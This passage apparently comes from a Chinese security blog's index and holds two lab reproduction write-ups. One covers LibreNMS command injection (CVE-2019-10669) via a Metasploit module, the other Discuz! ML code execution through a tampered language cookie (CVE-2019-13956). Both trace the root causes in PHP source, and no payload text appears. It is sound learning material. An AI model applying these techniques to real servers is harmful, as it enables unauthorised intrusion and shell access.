    <content><![CDATA[<h4 id="CVE-2019-10669LibreNMS-命令注入漏洞"><a href="#CVE-2019-10669LibreNMS-命令注入漏洞" class="headerlink" title="CVE-2019-10669LibreNMS 命令注入漏洞"></a>CVE-2019-10669LibreNMS 命令注入漏洞</h4><p>参考：<a href="https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md">https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md</a></p>
<a id="more"></a>

<h5 id="0x1-漏洞复现"><a href="#0x1-漏洞复现" class="headerlink" title="0x1 漏洞复现"></a>0x1 漏洞复现</h5><p>这个漏洞的环境也是蛮麻烦的</p>
<p>看到poc发现是集成的msf模块，然后到我的msf里一查，发现已经有了</p>
<p>攻击环境就准备好了</p>
<p>靶机环境：</p>
<p>本来想下软件装，装了好几次不成功</p>
<p>参考：<a href="https://cloud.tencent.com/developer/article/1518046">https://cloud.tencent.com/developer/article/1518046</a></p>
<p>先下一个librenms的ubuntu版直接虚拟机跑</p>
<p>然后根据参考改一下网卡的配置，在主机上访问对应的ip地址和端口就能访问web界面了</p>
<p>此时在kali里跑msf，始终打不成功，看报错是没找到对应的collectd插件</p>
<p>需要在ubuntu换源更新下载安装一条龙</p>
<p>装好了之后根据官方配置（太简略，并不能成功（<a href="https://docs.librenms.org/Support/Configuration/#collectd">https://docs.librenms.org/Support/Configuration/#collectd</a></p>
<p>最后找到github上一个配置才成功，此时页面上出现了collectd插件</p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100410102.png" alt="image-20201112100410102"></p>
<p>也能打成功了</p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100430763.png" alt="image-20201112100430763"></p>
<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>漏洞点：html/includes/graphs/device/collectd.inc.php</p>
<p>其中用户提供的参数from和to是用mysqli_escape_real_string函数（mres）过滤的，但是这个函数不能转义多个命令行语法字符，我们就可以注入命令到变量$rrd_cmd中，通过passthru()执行</p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/DED6A2E31D73FFB660CEFBF548FD1BD6.png" alt="DED6A2E31D73FFB660CEFBF548FD1BD6"></p>
<p>passthru — 执行外部程序并且显示原始输出</p>
<p>passthru ( string $command [, int &amp;$return_var ] ) : void </p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/B99C52DBA71F8893ED2EBA7059B778F5.jpg" alt="B99C52DBA71F8893ED2EBA7059B778F5"></p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205158282.png" alt="image-20201112205158282"></p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205315869.png" alt="image-20201112205315869"></p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412.jpg" alt="3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412"></p>
<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205357269.png" alt="image-20201112205357269"></p>
<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>librenms</tag>
      </tags>
  </entry>
  <entry>
    <title>0x0Dcve-2019-13956</title>
    <url>/2020/11/12/0x0Dcve-2019-13956/</url>
    <content><![CDATA[<h4 id="CVE-2019-13956Discuz-ML远程代码执行"><a href="#CVE-2019-13956Discuz-ML远程代码执行" class="headerlink" title="CVE-2019-13956Discuz! ML远程代码执行"></a>CVE-2019-13956Discuz! ML远程代码执行</h4><p>参考：<a href="https://www.cnblogs.com/yuzly/p/11386755.html">https://www.cnblogs.com/yuzly/p/11386755.html</a></p>
<a id="more"></a>

<h5 id="0x1-复现过程"><a href="#0x1-复现过程" class="headerlink" title="0x1 复现过程"></a>0x1 复现过程</h5><p>这个漏洞复现起来还是很容易的，软件也是免费开源的，搭起来就没什么问题</p>
<p>先去下载了v3.3的版本：<a href="https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=">https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=</a></p>
<p>然后开PHPstudy往里一放即可到网页上Install</p>
<p>点击链接抓包改包</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150139079.png" alt="image-20201112150139079"></p>
<p>可以看到缓存里的内容被更改了</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150217140.png" alt="image-20201112150217140"></p>
<p>上传shell</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150159180.png" alt="image-20201112150159180"></p>
<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>在/upload/source/module/portal/portal_index.php文件中</p>
<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112155957305.png" alt="image-20201112155957305"></p>
<p>使用template函数处理’diy:portal/index’,然后使用include_once包含</p>
<p>include_once：</p>
<p>可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。 </p>
<p>跟进template函数：</p>
<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112160428730.png" alt="image-20201112160428730"></p>
<p>可以看到返回的是一个拼接值,以及相关的两个变量DISCUZ_LANG和DISCUZ_ROOT</p>
<p>找到它们的定义，DISCUZ_ROOT是个固定的</p>
<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162712111.png" alt="image-20201112162712111"></p>
<p>DISCUZ_LANG和$lng有关</p>
<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162520552.png" alt="image-20201112162520552"></p>
<p>我们可以看到$lng和cookie中的languages有关，那我们就可以控制这个变量然后改包了</p>
<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162914790.png" alt="image-20201112162914790"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>discuz</tag>
      </tags>
  </entry>
</search>
